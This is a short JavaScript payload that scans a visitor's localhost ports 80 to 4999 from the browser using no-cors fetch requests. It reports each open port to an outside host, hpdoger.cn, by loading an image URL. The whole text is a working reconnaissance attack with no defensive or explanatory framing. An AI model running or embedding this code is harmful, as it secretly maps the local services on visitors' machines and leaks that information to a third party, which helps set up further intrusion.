const checkPort = (port) => {
	fetch(`http://127.0.0.1:${port}/`, { mode: "no-cors" }).then(() => {
        	let img = new Image();
            img.src = `http://hpdoger.cn/?status=found&port=${port}`;
            console.log(`port foud:${port}`);
    	})
}

for (i = 80; i < 5000; i++) { 
    checkPort(i);    
}
